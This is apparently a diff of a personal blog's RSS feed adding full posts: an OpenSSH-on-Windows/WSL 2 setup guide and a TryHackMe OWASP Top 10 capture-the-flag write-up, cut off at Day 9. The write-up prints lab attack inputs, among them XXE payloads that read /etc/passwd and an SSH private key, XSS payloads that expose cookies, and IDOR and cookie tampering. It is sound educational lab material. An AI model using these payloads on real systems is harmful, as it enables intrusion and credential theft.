+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/xfce-desktop-background.png&#34; alt=&#34;XFCE desktop background set to black&#34;&gt;&lt;/p&gt;
+&lt;p&gt;All done!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-finished-desktop.png&#34; alt=&#34;Kali desktop finished&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;future-improvements&#34;&gt;Future improvements&lt;/h2&gt;
+&lt;p&gt;It’s possible to enable sound with &lt;a href=&#34;https://github.com/neutrinolabs/pulseaudio-module-xrdp&#34;&gt;pulseaudio-module-xrdp&lt;/a&gt;. I might try getting that to work if I ever need sound support. Also, usb-over-ip might be a possibility, but I don’t know what types of devices are supported with that.&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;If you need to run Windows as your host OS and aren’t willing to give up WSL 2, then Hyper-V is a decent alternative to VirtualBox and VMware Workstation. It’s not quite as polished as the other options for desktop Linux, but hopefully Microsoft makes some improvements in the future to make it run more smoothly.&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -25,6 +254,74 @@
       <guid>https://markramige.com/posts/using-ssh-on-windows-10-and-wsl-2/</guid>
       <description>Since WSL was introduced several years ago, I&amp;rsquo;ve been using the same process for access my machines remotely. I&amp;rsquo;d run apt-get install openssh-server in WSL and open TCP port 22 in Windows Firewall. WSL 2 adds the extra step of needing to forward a port to the WSL VM. I decided to try using OpenSSH directly since it is now available natively on Windows.
 Contents  Install sshd, ssh, and ssh-agent Run sshd and ssh-agent at boot Start sshd and ssh-agent now Create ssh key and add to ssh-agent Add public keys to authorized_keys and set correct permissions Disable password login and restart sshd Make Git for Windows use ssh-agent Set up WSL distributions to use ssh-agent Future improvements Conclusion  *Open a PowerShell prompt with administrator privileges*</description>
+      <content>&lt;p&gt;Since WSL was introduced several years ago, I&amp;rsquo;ve been using the same process for access my machines remotely. I&amp;rsquo;d run &lt;code&gt;apt-get install openssh-server&lt;/code&gt; in WSL and open TCP port 22 in Windows Firewall. WSL 2 adds the extra step of needing to &lt;a href=&#34;https://www.hanselman.com/blog/HowToSSHIntoWSL2OnWindows10FromAnExternalMachine.aspx&#34;&gt;forward a port to the WSL VM&lt;/a&gt;. I decided to try using OpenSSH directly since it is now available &lt;a href=&#34;https://github.com/PowerShell/Win32-OpenSSH&#34;&gt;natively on Windows&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;contents&#34;&gt;Contents&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#install-sshd-ssh-and-ssh-agent&#34;&gt;Install sshd, ssh, and ssh-agent&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#run-sshd-and-ssh-agent-at-boot&#34;&gt;Run sshd and ssh-agent at boot&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#start-sshd-and-ssh-agent-now&#34;&gt;Start sshd and ssh-agent now&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#create-ssh-key-and-add-to-ssh-agent&#34;&gt;Create ssh key and add to ssh-agent&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#add-public-keys-to-authorized_keys-and-set-correct-permissions&#34;&gt;Add public keys to authorized_keys and set correct permissions&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#disable-password-login-and-restart-sshd&#34;&gt;Disable password login and restart sshd&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#make-git-for-windows-use-ssh-agent&#34;&gt;Make Git for Windows use ssh-agent&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#set-up-wsl-2-distributions-to-use-ssh-agent&#34;&gt;Set up WSL distributions to use ssh-agent&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#future-improvements&#34;&gt;Future improvements&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#conclusion&#34;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;*Open a PowerShell prompt with administrator privileges*&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;install-sshd-ssh-and-ssh-agent&#34;&gt;Install sshd, ssh, and ssh-agent&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;run-sshd-and-ssh-agent-at-boot&#34;&gt;Run sshd and ssh-agent at boot&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;Set-Service -Name sshd -StartupType &#39;Automatic&#39;
+Set-Service -Name ssh-agent -StartupType &#39;Automatic&#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;start-sshd-and-ssh-agent-now&#34;&gt;Start sshd and ssh-agent now&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;Start-Service sshd
+Start-Service ssh-agent
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;create-ssh-key-and-add-to-ssh-agent&#34;&gt;Create SSH key and add to ssh-agent&lt;/h2&gt;
+&lt;p&gt;Ignore the &lt;code&gt;-t ed25519&lt;/code&gt; if you need to connect to servers running older OSes&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ssh-keygen -t ed25519
+ssh-add
+ssh-add -L
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;add-public-keys-to-authorized_keys-and-set-correct-permissions&#34;&gt;Add public keys to authorized_keys and set correct permissions&lt;/h2&gt;
+&lt;p&gt;Windows sshd will read two different authorized_keys files depending on if your user account is an administrator.&lt;/p&gt;
+&lt;p&gt;The location for normal users is &lt;code&gt;%userprofile%\.ssh\authorized_keys&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The location for administrators is &lt;code&gt;%programdata%\ssh\administrators_authorized_keys&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;administrators_authorized_keys&lt;/code&gt; file will need special permissions set before sshd will use it&lt;/p&gt;
+&lt;p&gt;Copy any public keys you want to grant access to your computer to the correct file and then set the administrators_authorized_keys file permissions if needed.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;icacls administrators_authorized_keys /inheritance:r
+icacls administrators_authorized_keys /grant SYSTEM:`(F`)
+icacls administrators_authorized_keys /grant BUILTIN\Administrators:`(F`)
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;disable-password-login-and-restart-sshd&#34;&gt;Disable password login and restart sshd&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;Stop-Service sshd
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Copy C:\ProgramData\ssh\sshd_config to your desktop and edit&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#PasswordAuthentication yes
+PasswordAuthentication no
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Move the file back to %programdata%\ssh and then set the correct permissions&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Get-Acl sshd.pid | Set-Acl sshd_config
+Start-Service sshd
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;make-git-for-windows-use-ssh-agent&#34;&gt;Make Git for Windows use ssh-agent&lt;/h2&gt;
+&lt;p&gt;Search for &lt;code&gt;env&lt;/code&gt; in start and choose the &lt;code&gt;Edit environment variables for your account&lt;/code&gt; option.
+&lt;img src=&#34;https://markramige.com/images/using-ssh-on-windows-10-and-wsl-2/start-menu-edit-environment-variables.png&#34; alt=&#34;Search for env on the start menu and choose Edit the system environment variables&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Create a new variable named &lt;code&gt;GIT_SSH&lt;/code&gt; with a value of &lt;code&gt;C:\Windows\System32\OpenSSH\ssh.exe&lt;/code&gt;
+&lt;img src=&#34;https://markramige.com/images/using-ssh-on-windows-10-and-wsl-2/windows-add-git-ssh-environment-variable.png&#34; alt=&#34;Add the GIT_SSH variable&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;set-up-wsl-2-distributions-to-use-ssh-agent&#34;&gt;Set up WSL 2 distributions to use ssh-agent&lt;/h2&gt;
+&lt;p&gt;Download &lt;a href=&#34;https://github.com/rupor-github/wsl-ssh-agent/releases/download/v1.4.2/wsl-ssh-agent.7z&#34;&gt;wsl-ssh-agent.7z&lt;/a&gt; and extract &lt;code&gt;npiperelay.exe&lt;/code&gt; to a new directory called &lt;code&gt;.wsl&lt;/code&gt; in your Windows user&amp;rsquo;s home folder.&lt;/p&gt;
+&lt;p&gt;In your WSL distribution, run &lt;code&gt;ln -s /mnt/c/Users/YOURWINDOWSUSERNAME ~/winhome&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Create a &lt;code&gt;.ssh&lt;/code&gt; folder and &lt;code&gt;chmod 700 ~/.ssh&lt;/code&gt; if it doesn&amp;rsquo;t already exist.&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;sudo apt install socat&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Add this snippet to the &lt;code&gt;.bashrc&lt;/code&gt; file in your WSL distribution.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;export SSH_AUTH_SOCK&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$HOME/.ssh/agent.sock
+ss -a | grep -q $SSH_AUTH_SOCK
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $? -ne &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+    rm -f $SSH_AUTH_SOCK
+    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; setsid socat UNIX-LISTEN:$SSH_AUTH_SOCK,fork EXEC:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$HOME&lt;span style=&#34;color:#e6db74&#34;&gt;/winhome/.wsl/npiperelay.exe -ei -s //./pipe/openssh-ssh-agent&amp;#34;&lt;/span&gt;,nofork &amp;amp; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt;/dev/null 2&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;future-improvements&#34;&gt;Future improvements&lt;/h2&gt;
+&lt;p&gt;I would like to sync up my ssh config file between Windows and WSL. Symlinking the file inside WSL doesn&amp;rsquo;t work because it needs 600 permissions or ssh will give you an error.&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;I like the added benefit of being able to run native Windows commands via SSH and being able to access multiple WSL distributions with the same SSH server. I think if you are already using sshd inside a WSL distribution and don&amp;rsquo;t need these benefits, then it&amp;rsquo;s not worth switching to native Windows OpenSSH.&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -35,6 +332,229 @@ Contents  Install sshd, ssh, and ssh-agent Run sshd and ssh-agent at boot Start 
       <guid>https://markramige.com/posts/tryhackme-owasp-top-10-write-up/</guid>
       <description>This challenge on TryHackMe was initially released over a period of ten days covering one of the OWASP Top Ten vulnerabilities per day. In includes an introduction and explanation of each vulnerability type and one or multiple exercises for each. It is beginner friendly.
 Contents  Day 1 - Injection Day 2 - Broken Authentication Day 3 - Sensitive Data Exposure Day 4 - XML External Entities Day 5 - Broken Access Control Day 6 - Security Misconfiguration Day 7 - Cross-site Scripting (XSS) Day 8 - Insecure Deserialization Day 9 - Using Components with Known Vulnerabilities Day 10 - Insufficient Logging and Monitoring  Day 1 - Injection Task 5 Visit http://MACHINE_IP/evilshell.</description>
+      <content>&lt;p&gt;&lt;a href=&#34;https://tryhackme.com/room/owasptop10&#34;&gt;This challenge&lt;/a&gt; on TryHackMe was initially released over a period of ten days covering one of the OWASP Top Ten vulnerabilities per day. In includes an introduction and explanation of each vulnerability type and one or multiple exercises for each. It is beginner friendly.&lt;/p&gt;
+&lt;h2 id=&#34;contents&#34;&gt;Contents&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#day-1---injection&#34;&gt;Day 1 - Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-2---broken-authentication&#34;&gt;Day 2 - Broken Authentication&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-3---sensitive-data-exposure&#34;&gt;Day 3 - Sensitive Data Exposure&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-4---xml-external-entities&#34;&gt;Day 4 - XML External Entities&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-5---broken-access-control&#34;&gt;Day 5 - Broken Access Control&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-6---security-misconfiguration&#34;&gt;Day 6 - Security Misconfiguration&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-7---cross-site-scripting-(xss)&#34;&gt;Day 7 - Cross-site Scripting (XSS)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-8---insecure-deserialization&#34;&gt;Day 8 - Insecure Deserialization&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-9---using-components-with-known-vulnerabilities&#34;&gt;Day 9 - Using Components with Known Vulnerabilities&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-10---insufficient-logging-and-monitoring&#34;&gt;Day 10 - Insufficient Logging and Monitoring&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;day-1---injection&#34;&gt;Day 1 - Injection&lt;/h2&gt;
+&lt;h3 id=&#34;task-5&#34;&gt;Task 5&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP/evilshell.php&lt;/code&gt; to complete the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What strange text file is in the website root directory?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;ls /var/www/html&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;How many non-root/non-service/non-daemon users are there?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;cat /etc/passwd&lt;/code&gt; and look for regular user accounts&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What user is this app running as?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;whoami&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the user&amp;rsquo;s shell set as?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;grep USERNAME /etc/passwd&lt;/code&gt; (replace USERNAME with the previous answer&amp;rsquo;s user name)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What version of Ubuntu is running?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;lsb_release -a&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Print out the MOTD. What favorite beverage is shown?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;cat /etc/update-motd.d/00-header&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;day-2---broken-authentication&#34;&gt;Day 2 - Broken Authentication&lt;/h2&gt;
+&lt;h3 id=&#34;task-7&#34;&gt;Task 7&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP:8888&lt;/code&gt; to complete the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the flag that you found in darren&amp;rsquo;s account?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Follow the instructions to create an account &amp;quot; darren&amp;quot; and set the password. Log in as that account with your password and the flag will be shown.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Now try to do the same trick and see if you can login as arthur.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;What is the flag that you found in arthur&amp;rsquo;s account?&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Follow the instructions to create an account &amp;quot; arthur&amp;quot; and set the password. Log in as that account with your password and the flag will be shown.&lt;/p&gt;
+&lt;h2 id=&#34;day-3---sensitive-data-exposure&#34;&gt;Day 3 - Sensitive Data Exposure&lt;/h2&gt;
+&lt;h3 id=&#34;task-11&#34;&gt;Task 11&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP&lt;/code&gt; to complete the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the name of the mentioned directory?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Look at the source of the /login page and the answer is commented out.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;There is a database file listed in the directory.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Use the supporting material to access the sensitive data. What is the password hash of the admin user?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Running the &lt;code&gt;file&lt;/code&gt; command on the database file reveals that it is a sqlite3 file. We can now use the &lt;code&gt;sqlite3&lt;/code&gt; command to access the sensitive data. We use the instructions in Task 9 to get the password hash.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Crack the hash. What is the admin&amp;rsquo;s plaintext password?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Use &lt;a href=&#34;https://crackstation.net/&#34;&gt;Crackstation&lt;/a&gt; to crack the password hash.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Login as the admin. What is the flag?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Use the credentials from the cracked hash to get the flag.&lt;/p&gt;
+&lt;h2 id=&#34;day-4---xml-external-entities&#34;&gt;Day 4 - XML External Entities&lt;/h2&gt;
+&lt;h3 id=&#34;task-16&#34;&gt;Task 16&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP&lt;/code&gt; to complete the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Try to display your own name using any payload.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I used a modified payload from Task 15 to display my name:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY name &amp;quot;Mark&amp;quot;&amp;gt; ]&amp;gt;
+ &amp;lt;userInfo&amp;gt;
+  &amp;lt;firstName&amp;gt;&amp;amp;name;&amp;lt;/firstName&amp;gt;
+ &amp;lt;/userInfo&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;See if you can read the /etc/passwd&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can use the payload from Task 15 as is:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE root [&amp;lt;!ENTITY read SYSTEM &#39;file:///etc/passwd&#39;&amp;gt;]&amp;gt;
+&amp;lt;root&amp;gt;&amp;amp;read;&amp;lt;/root&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;What is the name of the user in /etc/passwd&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The user with id 1000 is the one they&amp;rsquo;re looking for.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Where is falcon&amp;rsquo;s SSH key located?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can modify the previous payload slightly to read a different file where we think the SSH key is located:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE root [&amp;lt;!ENTITY read SYSTEM &#39;file:///home/falcon/.ssh/id_rsa&#39;&amp;gt;]&amp;gt;
+&amp;lt;root&amp;gt;&amp;amp;read;&amp;lt;/root&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;What are the first 18 characters for falcon&amp;rsquo;s private key&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We already successfully read the private key in the previous answer so we just copy and paste the first 18 characters.&lt;/p&gt;
+&lt;h2 id=&#34;day-5---broken-access-control&#34;&gt;Day 5 - Broken Access Control&lt;/h2&gt;
+&lt;h3 id=&#34;task-18&#34;&gt;Task 18&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP&lt;/code&gt; to answer the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Look at other users notes. What is the flag?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;After logging in, the URL changes to &lt;code&gt;http://MACHINE_IP/note.php?note=1&lt;/code&gt;. We can change the note parameter to different numbers to access other users&#39; notes.&lt;/p&gt;
+&lt;h2 id=&#34;day-6---security-misconfiguration&#34;&gt;Day 6 - Security Misconfiguration&lt;/h2&gt;
+&lt;h3 id=&#34;task-19&#34;&gt;Task 19&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP&lt;/code&gt; to answer the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hack into the webapp, and find the flag!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This challenge focuses on default credentials. We can search the web for the source code for this web app and see if there is a default user account that hasn&amp;rsquo;t been deleted or whose password hasn&amp;rsquo;t been changed.&lt;/p&gt;
+&lt;p&gt;We find the source on &lt;a href=&#34;https://github.com/NinjaJc01/PensiveNotes&#34;&gt;Github&lt;/a&gt;. The documentation gives us the default user name and password.&lt;/p&gt;
+&lt;p&gt;Logging in with those credentials gives us the flag.&lt;/p&gt;
+&lt;h2 id=&#34;day-7---cross-site-scripting-xss&#34;&gt;Day 7 - Cross-site Scripting (XSS)&lt;/h2&gt;
+&lt;h3 id=&#34;task-20&#34;&gt;Task 20&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Navigate to &lt;code&gt;http://MACHINE_IP/&lt;/code&gt; in your browser and click on the &amp;ldquo;Reflected XSS&amp;rdquo; tab on the navbar; craft a reflected XSS payload that will cause a popup saying &amp;ldquo;Hello&amp;rdquo;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can submit &lt;code&gt;alert(&#39;Hello&#39;)&lt;/code&gt; in the search box to demonstrate reflected XSS because there is no filtering on the search input.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;First we need to find out how to get the hostname with javascript. &lt;a href=&#34;https://www.w3schools.com/js/js_window_location.asp&#34;&gt;w3schools&lt;/a&gt; comes through with the first result.&lt;/p&gt;
+&lt;p&gt;We try &lt;code&gt;alert(window.location.hostname)&lt;/code&gt; in the search box and the flag is returned.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Now navigate to &lt;code&gt;http://MACHINE_IP/stored&lt;/code&gt; in your browser and make an account.
+Then add a comment and see if you can insert some of your own HTML.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can use &lt;code&gt;&amp;lt;h1&amp;gt;test&amp;lt;/h1&amp;gt;&lt;/code&gt; in the comment box to insert HTML on the page and the flag is returned.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;On the same page, create an alert popup box appear on the page with your document cookies.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We check &lt;a href=&#34;https://www.w3schools.com/js/js_cookies.asp&#34;&gt;w3schools&lt;/a&gt; again for how to get cookies in Javascript. The payload &lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt;&lt;/code&gt; returns our cookies with an alert box and gives us the flag.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Change &amp;ldquo;XSS Playground&amp;rdquo; to &amp;ldquo;I am a hacker&amp;rdquo; by adding a comment and using Javascript.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We use &lt;a href=&#34;https://www.w3schools.com/js/js_htmldom_html.asp&#34;&gt;w3schools&lt;/a&gt; again to find out how to change text on the page using javascript.&lt;/p&gt;
+&lt;p&gt;Inspecting the page reveals that we need to change &lt;code&gt;&amp;lt;span id=&amp;quot;thm-title&amp;quot;&amp;gt;XSS Playground&amp;lt;/span&amp;gt;&lt;/code&gt; to &lt;code&gt;&amp;lt;span id=&amp;quot;thm-title&amp;quot;&amp;gt;I am a hacker&amp;lt;/span&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We can use &lt;code&gt;&amp;lt;script&amp;gt;document.getElementById(&amp;quot;thm-title&amp;quot;).innerHTML = &amp;quot;I am a hacker&amp;quot;;&amp;lt;/script&amp;gt;&lt;/code&gt; to change the text and get the flag.&lt;/p&gt;
+&lt;h2 id=&#34;day-8---insecure-deserialization&#34;&gt;Day 8 - Insecure Deserialization&lt;/h2&gt;
+&lt;h3 id=&#34;task-21&#34;&gt;Task 21&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Who developed the Tomcat application?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Google should give us the answer here.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What type of attack that crashes services can be performed with insecure deserialization?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The answer is given in the Task text.&lt;/p&gt;
+&lt;h3 id=&#34;task-22&#34;&gt;Task 22&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Select the correct term of the following statement:
+if a dog was sleeping, would this be:
+A) A State
+B) A Behaviour&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Read the task text and understand the difference between state and behavior.&lt;/p&gt;
+&lt;h3 id=&#34;task-23&#34;&gt;Task 23&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the name of the base-2 formatting that data is sent across a network as?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Read the task text to find the answer.&lt;/p&gt;
+&lt;h3 id=&#34;task-24&#34;&gt;Task 24&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Read the task text to find the answer.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the acronym for the web technology that Secure cookies work over?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Again the answer is in the text.&lt;/p&gt;
+&lt;h3 id=&#34;task-25&#34;&gt;Task 25&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP&lt;/code&gt; to answer the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;1st flag (cookie value)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can use the instructions in the task text to view the cookies after we log in. The &lt;code&gt;sessionId&lt;/code&gt; cookie is base64 encoded. We can visit &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;CyberChef&lt;/a&gt; and use the &lt;code&gt;From Base64&lt;/code&gt; recipe on the &lt;code&gt;sessionId&lt;/code&gt; value to get the flag.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;2nd flag (admin dashboard)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We change the &lt;code&gt;userType&lt;/code&gt; cookie value to &lt;code&gt;admin&lt;/code&gt; and navigate to &lt;code&gt;http://MACHINE_IP/admin&lt;/code&gt; to get the admin flag.&lt;/p&gt;
+&lt;h3 id=&#34;task-26&#34;&gt;Task 26&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;flag.txt&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Follow the instructions in the task text to get a remote shell. Next run &lt;code&gt;ls $HOME&lt;/code&gt; to find the flag file and &lt;code&gt;cat $HOME/flag.txt&lt;/code&gt; to get the flag text.&lt;/p&gt;
+&lt;h2 id=&#34;day-9---using-components-with-known-vulnerabilities&#34;&gt;Day 9 - Using Components with Known Vulnerabilities&lt;/h2&gt;
+&lt;h3 id=&#34;task-29&#34;&gt;Task 29&lt;/h3&gt;
